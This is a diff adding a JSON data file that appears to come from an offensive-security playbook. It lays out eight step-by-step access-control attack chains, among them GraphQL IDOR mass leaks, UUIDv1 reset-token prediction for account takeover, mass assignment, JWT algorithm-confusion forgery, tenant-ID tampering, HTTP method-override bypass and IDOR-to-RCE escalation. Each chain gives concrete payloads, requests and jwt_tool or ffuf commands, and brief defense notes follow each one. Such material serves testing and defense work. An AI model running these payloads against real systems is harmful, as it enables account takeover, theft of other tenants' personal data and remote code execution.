@@ -1,0 +1,382 @@
+{
+  "domain": "Access Control",
+  "domainLabel": "Access Control / IDOR",
+  "domainOrder": 1,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "IDOR via GraphQL global node IDs + alias batching: leaking billing for all tenants",
+      "level": "intermediate",
+      "impact": "Mass leak of invoices and payment PII for all tenants in a single request.",
+      "why": "The 'opaque' base64 node IDs in GraphQL are just a disguised gid://app/Type/123, and aliasing turns a single IDOR into a mass leak while also bypassing the rate limit.",
+      "precondition": "A GraphQL API with the Relay node(id:) / nodes(ids:) interface where the resolver lacks an object-level access check.",
+      "tags": [
+        "graphql",
+        "idor",
+        "bola",
+        "cross-tenant",
+        "relay",
+        "batching"
+      ],
+      "realWorld": "Shopify HackerOne #2207248 (IDOR on GraphQL BillingDocumentDownload/BillDetails); HackerOne #2633771; GitLab #2528293.",
+      "defense": "Enforce access inside every node resolver, not just on the route; alert on requests with an abnormally large number of aliases and fields.",
+      "steps": [
+        {
+          "title": "Decode the intercepted global ID",
+          "kind": "note",
+          "detail": "echo 'WyJCaWxsaW5nRG9jdW1lbnQiLDEyM10=' | base64 -d  ->  [\"BillingDocument\",123] / gid://app/BillingDocument/123"
+        },
+        {
+          "title": "Confirm IDOR on an adjacent object",
+          "kind": "note",
+          "detail": "Increment int to 124, re-base64, replay in Burp Repeater: query{node(id:\"<gid>\"){... on BillingDocument{pdfUrl tenant{name}}}}",
+          "success": "the response contains another tenant's pdfUrl and tenant.name"
+        },
+        {
+          "title": "Map adjacent sensitive types",
+          "kind": "note",
+          "detail": "Introspection: query{__schema{types{name fields{name}}}}  ->  find BillDetails, Invoice, Export nodes"
+        },
+        {
+          "title": "Mass leak via aliases in one request",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "query{a1:node(id:\"gid0\"){...F} a2:node(id:\"gid1\"){...F} ... a500:node(id:\"gid499\"){...F}}"
+        },
+        {
+          "title": "Move to the file-download resolver",
+          "kind": "note",
+          "detail": "Call BillingDocumentDownload(id:) / fetch the signed pdfUrl per leaked record"
+        }
+      ]
+    },
+    {
+      "title": "Sandwich attack: predicting a UUIDv1 reset token for a 0-click ATO",
+      "level": "advanced",
+      "impact": "Takeover of any account with no victim interaction, including admins; critical.",
+      "why": "UUIDv1 reset tokens look random but are a timestamp plus a MAC; by 'sandwiching' the victim's request between two of your own, you narrow the timestamp down to a tiny brute-forceable window.",
+      "precondition": "A reset, invite, or email-confirmation flow issues a version 1 UUID, and you can see two of your own tokens bracketing the victim's token.",
+      "tags": [
+        "idor",
+        "uuidv1",
+        "password-reset",
+        "account-takeover",
+        "predictable-token"
+      ],
+      "realWorld": "landh.tech '0-Click ATO with the Sandwich Attack' (2023); AppSec Labs 'Sandwich Attacks'; intruder.io guidtool.",
+      "defense": "CSPRNG tokens (UUIDv4 / secrets, 128+ bits), a short single-use TTL, and a rate limit on reset issuance per account and IP.",
+      "steps": [
+        {
+          "title": "Fingerprint the token as UUIDv1",
+          "kind": "note",
+          "detail": "uuidtool.py <token>  ->  version nibble = 1, identical node (MAC) across requests",
+          "success": "version=1, the node (MAC) matches across requests"
+        },
+        {
+          "title": "First slice: reset your own account",
+          "kind": "note",
+          "detail": "Request a reset for your own account, record token T1 (lower time bound)"
+        },
+        {
+          "title": "The filling: reset for the victim",
+          "kind": "note",
+          "detail": "POST /api/password/reset {\"email\":\"victim@target\"}  (victim token generated between yours)"
+        },
+        {
+          "title": "Second slice: reset your own account again",
+          "kind": "note",
+          "detail": "Request your own reset again, record token T2 (upper time bound)"
+        },
+        {
+          "title": "Generate candidates in the window and brute-force confirm",
+          "kind": "note",
+          "detail": "guidtool -t T1 -r T1,T2  (or Lupin-Holmes/sandwich), then loop GET /reset?token=<candidate>"
+        }
+      ]
+    },
+    {
+      "title": "Mass assignment and nested-object injection: role and tenancy escalation",
+      "level": "newbie",
+      "impact": "Self-escalation to admin and/or moving a user into another organization (cross-tenant control).",
+      "why": "The backend blindly binds the entire JSON body to the ORM model, so one extra key rewrites your privileges or tenant membership.",
+      "precondition": "A profile, registration, or settings update (PUT/PATCH /api/users/{me}) that maps directly onto the user entity.",
+      "tags": [
+        "mass-assignment",
+        "idor",
+        "privilege-escalation",
+        "cross-tenant",
+        "hpp"
+      ],
+      "realWorld": "RegistrationMagic CVE-2024-1991 (auth->admin); Homakov 2012 GitHub Rails mass assignment; Cobalt 'Mass Assignment in the Wild'.",
+      "defense": "Bind via an allow-list DTO / strong params; never accept role or tenant_id from the request body; log changes to privileged fields.",
+      "steps": [
+        {
+          "title": "Learn the model's real field names",
+          "kind": "checklist",
+          "q": "mass-assignment",
+          "detail": "Diff GET /api/users/me response keys vs the fields the form submits"
+        },
+        {
+          "title": "Brute-force hidden bindable parameters",
+          "kind": "script",
+          "q": "Parameter discovery sources (gau+katana -> unfurl -> arjun)",
+          "detail": "Burp Param Miner \"Guess JSON parameters\" / ffuf the body keyspace"
+        },
+        {
+          "title": "Inject privileged keys into the update",
+          "kind": "payload",
+          "q": "Mass Assignment",
+          "detail": "Add \"role\":\"admin\" / \"isAdmin\":true / \"is_staff\":true / \"permissions\":[\"*\"]",
+          "success": "re-login shows role=admin / an admin route opens"
+        },
+        {
+          "title": "If flat keys are filtered: nesting and HPP",
+          "kind": "payload",
+          "q": "HTTP Parameter Pollution",
+          "detail": "\"user[role]\":\"admin\", {\"organization\":{\"id\":\"<otherTenant>\"}}, duplicate role=user&role=admin"
+        },
+        {
+          "title": "Verify the escalation and move on",
+          "kind": "note",
+          "detail": "Re-auth, then hit an admin-only route to confirm the new privilege"
+        }
+      ]
+    },
+    {
+      "title": "JWT role-claim tampering and algorithm confusion: instant admin",
+      "level": "advanced",
+      "impact": "Forging an admin token with no credentials, full BFLA escalation across the entire API.",
+      "why": "The server hands you the very token it trusts; flipping the role claim to admin and re-signing with the public key (RS256 → HS256) or alg:none turns identity into a client-controlled field.",
+      "precondition": "The app authorizes off JWT claims and either accepts an attacker-chosen alg or exposes the RSA public key (/jwks.json, TLS certificate, recovery from two tokens).",
+      "tags": [
+        "jwt",
+        "algorithm-confusion",
+        "alg-none",
+        "privilege-escalation",
+        "kid-injection",
+        "bfla"
+      ],
+      "realWorld": "PortSwigger 'Algorithm confusion attacks'; Auth0 jsonwebtoken alg:none (CVE-2015-9235); HackTricks JWT.",
+      "defense": "Hard-pin a single server-side algorithm, reject alg:none, separate keys by purpose, validate kid against an allow-list.",
+      "steps": [
+        {
+          "title": "Decode the token and find the privilege claim",
+          "kind": "command",
+          "q": "jwt_tool",
+          "detail": "jwt_tool <jwt>  ->  find \"role\":\"user\" / \"isAdmin\":false / \"tenant\":\"A\""
+        },
+        {
+          "title": "Try the trivial bypasses first",
+          "kind": "payload",
+          "q": "JSON Web Token",
+          "detail": "jwt_tool <jwt> -X a  (alg:none / strip signature), or flip the claim and replay if the signature is unverified"
+        },
+        {
+          "title": "Obtain the RSA public key",
+          "kind": "note",
+          "detail": "Pull /jwks.json, or use jwt_tool rsa_sign2n to derive pubkey.pem from 2 captured tokens"
+        },
+        {
+          "title": "Forge an HS256 token signed with the public key",
+          "kind": "payload",
+          "q": "JSON Web Token",
+          "detail": "jwt_tool <jwt> -X k -pk pubkey.pem  with \"role\":\"admin\",\"tenant\":\"victim\"",
+          "success": "the server accepts the forged token, access to the admin API"
+        },
+        {
+          "title": "Abuse kid for SQLi or key path traversal",
+          "kind": "note",
+          "detail": "\"kid\":\"../../../dev/null\" (empty HMAC key) or kid SQLi to control the HMAC secret"
+        }
+      ]
+    },
+    {
+      "title": "Bypassing tenant isolation by tampering with org_id / X-Tenant-ID / Host",
+      "level": "intermediate",
+      "impact": "Reading and writing any other tenant's data (CRM, invoices, leads); mass cross-tenant leak.",
+      "why": "The app authenticates you correctly but determines 'which tenant' from a header, path, or body field you control, so a single org_id swap lands you in a neighbor's data.",
+      "precondition": "A multi-tenant app determines the tenant from a client-supplied X-Tenant-ID / Host / subdomain / org_id rather than from the session.",
+      "tags": [
+        "multi-tenant",
+        "idor",
+        "cross-tenant",
+        "tenant-isolation",
+        "org-id",
+        "autorize"
+      ],
+      "realWorld": "'Massive Cross-Tenant Access Control Bug' (Medium, 2024); 'Multi-Tenant Authz Bypass via Host Header'; OWASP Multi-Tenant Security Cheat Sheet.",
+      "defense": "Derive the tenant strictly from the authenticated session or token; add a row-level tenant_id = session.tenant check on every request.",
+      "steps": [
+        {
+          "title": "Diff every request across two sessions",
+          "kind": "script",
+          "q": "authz_matrix.py - authorization matrix (BOLA/no-auth)",
+          "detail": "Burp Autorize using Tenant-B cookies as the comparison identity"
+        },
+        {
+          "title": "Swap the tenant selector while keeping your own session",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "Change X-Tenant-ID, org_id=, /api/orgs/{otherOrg}/..., or Host: tenantB.app.com",
+          "success": "the response holds another tenant's data (leads/invoices)"
+        },
+        {
+          "title": "Enumerate tenant identifiers",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w orgids.txt -H \"X-Tenant-ID: FUZZ\" -u https://app/api/data  (filter on 200/size)"
+        },
+        {
+          "title": "Confirm write impact too",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "Replay the swap on POST/PUT/DELETE (edit leads, delete records), not just GET"
+        },
+        {
+          "title": "Escalate into another tenant's admin surface",
+          "kind": "note",
+          "detail": "POST /api/orgs/{victim}/members {\"email\":\"me\",\"role\":\"admin\"}"
+        }
+      ]
+    },
+    {
+      "title": "HTTP method confusion and method-override: bypassing the authz middleware",
+      "level": "intermediate",
+      "impact": "Access to admin actions (self-escalation, reading others' data) when only one method is protected.",
+      "why": "Authorization is attached to POST /admin/..., but the framework still routes GET and override-header variants to the same handler, so changing the method slips past the check.",
+      "precondition": "Access control is keyed on the method or Content-Type (e.g., middleware on POST only) while the framework still handles alternative verbs.",
+      "tags": [
+        "broken-access-control",
+        "http-verb-tampering",
+        "method-override",
+        "content-type",
+        "authz-bypass"
+      ],
+      "realWorld": "ESPv2 JWT bypass via X-HTTP-Method-Override (GHSA-6qmp-9p95-fc5f); PortSwigger 'Method-based access control'; HackerOne #775560.",
+      "defense": "Enforce authorization in a method-agnostic layer; ignore override headers unless explicitly needed; deny-by-default on unlisted verbs.",
+      "steps": [
+        {
+          "title": "Capture a baseline of the protected call",
+          "kind": "note",
+          "detail": "POST /api/admin/users/promote {\"role\":\"admin\"}  ->  403 baseline"
+        },
+        {
+          "title": "Change the HTTP method",
+          "kind": "note",
+          "detail": "Same path as GET /api/admin/users/promote?role=admin, or PUT/PATCH/HEAD",
+          "success": "a 200 response and the action performed instead of 403"
+        },
+        {
+          "title": "Slip in method-override headers",
+          "kind": "note",
+          "detail": "POST + header X-HTTP-Method-Override: GET / X-Method-Override / body _method=PUT"
+        },
+        {
+          "title": "Change Content-Type against format-based filters",
+          "kind": "note",
+          "detail": "Content-Type application/json  ->  application/x-www-form-urlencoded or text/plain, same params"
+        },
+        {
+          "title": "Automate the method-and-header matrix",
+          "kind": "script",
+          "q": "authz_method_bypass.py - access-control bypass by method/format",
+          "detail": "ffuf -X FUZZ over {GET,POST,PUT,PATCH,HEAD,OPTIONS} + override-header wordlist"
+        }
+      ]
+    },
+    {
+      "title": "Second-order IDOR: write here, read there",
+      "level": "advanced",
+      "impact": "Leaking other users' and tenants' PII through a secondary read path that bypasses the front-door authorization.",
+      "why": "You plant a reference to someone else's object where input is validated, but another feature later dereferences it with no check at all.",
+      "precondition": "Two linked features: one stores the ID you supply, the other later renders or sends data for that ID.",
+      "tags": [
+        "idor",
+        "second-order",
+        "stored-idor",
+        "export",
+        "webhook"
+      ],
+      "realWorld": "Ozgur Alp 'A Less Known Attack Vector: Second-Order IDOR Attacks'; Intigriti 'Advanced IDOR' guide.",
+      "defense": "Re-check object access at render or read time, not just on write; never treat a stored ID as pre-validated.",
+      "steps": [
+        {
+          "title": "Find a 'write here, read there' pair",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "Saved templates, \"share\", scheduled report, audit/activity feed, webhook target"
+        },
+        {
+          "title": "Plant the victim's object ID in the write field",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "POST /reports {\"data_source_id\":<victimId>}  (write-side only checks you own the report)"
+        },
+        {
+          "title": "Trigger the secondary read path",
+          "kind": "note",
+          "detail": "Run the export / open the activity log / fire the webhook that resolves data_source_id server-side"
+        },
+        {
+          "title": "Collect the leaked data from the second channel",
+          "kind": "note",
+          "detail": "Read the generated PDF/CSV or the webhook callback now containing victim PII",
+          "success": "the victim's PII appears in the PDF/CSV or the webhook callback"
+        },
+        {
+          "title": "Scale across the ID range",
+          "kind": "script",
+          "q": "idor_seq.py - sequential ID enumeration (threaded)",
+          "detail": "Loop the plant-then-trigger over sequential victim IDs"
+        }
+      ]
+    },
+    {
+      "title": "Sequential IDOR → client-side isAdmin tampering → full admin → RCE",
+      "level": "intermediate",
+      "impact": "From a single +1 to an ID, to thousands of customer records, a shared admin panel, and RCE via file upload/SSTI; full platform compromise.",
+      "why": "A boring sequential-ID IDOR on the dashboard becomes a disaster the moment you notice the login response carries isadmin:false that only the client checks.",
+      "precondition": "Sequential object IDs, an admin flag returned to and trusted from the client, and an admin panel with content or file-upload features.",
+      "tags": [
+        "idor",
+        "privilege-escalation",
+        "client-side-trust",
+        "forced-browsing",
+        "ssti",
+        "rce"
+      ],
+      "realWorld": "Eaton Zveare 'Compromising Honda's eCommerce dealer platform' (eaton-works.com, 2023); HackerOne Atavist #950881 (IDOR email change -> ATO).",
+      "defense": "Never trust client-returned role / isadmin; enforce server-side RBAC on every admin route; lock down file and template uploads in the admin panel.",
+      "steps": [
+        {
+          "title": "Walk sequential IDs (horizontal IDOR)",
+          "kind": "note",
+          "detail": "siteId=1004 then +1 reveals another dealer's dashboard and orders"
+        },
+        {
+          "title": "Tamper with the admin flag in the auth response",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "Burp Match&Replace \"isadmin\":false  ->  \"isadmin\":true  (or the local role cookie / JS state)",
+          "success": "the /admin menu items are unlocked"
+        },
+        {
+          "title": "Force-browse the now-exposed admin routes",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w admin-paths.txt -u https://app/admin/FUZZ  ->  /admin/users, /admin/network"
+        },
+        {
+          "title": "Mass-export PII for all tenants",
+          "kind": "note",
+          "detail": "Admin \"export orders\" pulls all dealers' customer records across years"
+        },
+        {
+          "title": "Turn admin into code execution",
+          "kind": "note",
+          "detail": "Admin template editor  ->  SSTI, or admin file/theme upload  ->  webshell  ->  RCE"
+        }
+      ]
+    }
+  ]
+}
